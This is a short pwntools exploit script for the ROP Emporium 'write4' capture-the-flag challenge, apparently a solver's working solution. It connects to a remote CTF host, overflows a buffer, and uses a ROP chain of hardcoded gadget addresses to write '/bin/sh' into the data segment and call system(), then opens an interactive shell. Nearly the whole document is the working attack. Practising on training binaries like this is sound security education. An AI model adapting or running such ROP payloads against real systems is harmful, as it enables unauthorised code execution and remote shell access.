# -*- coding:UTF-8 -*-
from pwn import *
#sh = process("/mnt/u/doc/pwn/rop_emporium/write4/write4")
sh=remote('ctf.taqini.space',28083)
# bss_addr = 0x0000000000601060     #写入到 bss 段
data_addr = 0x0000000000601050    #写入到 data 段
mov_r14_r15 = 0x0000000000400820
pop_r14_r15 = 0x0000000000400890
system_plt = 0x00000000004005E0
pop_rdi = 0x0000000000400893
payload = b''
payload +=  b'A'*0x20 + p64(0)
payload += p64(pop_r14_r15)
payload += p64(data_addr)
# payload += p64(bss_addr)
payload += b"/bin/sh\x00"
payload += p64(mov_r14_r15)
payload += p64(pop_rdi)
# payload += p64(bss_addr)
payload += p64(data_addr)
payload += p64(system_plt)
sh.sendline(payload)
sh.interactive()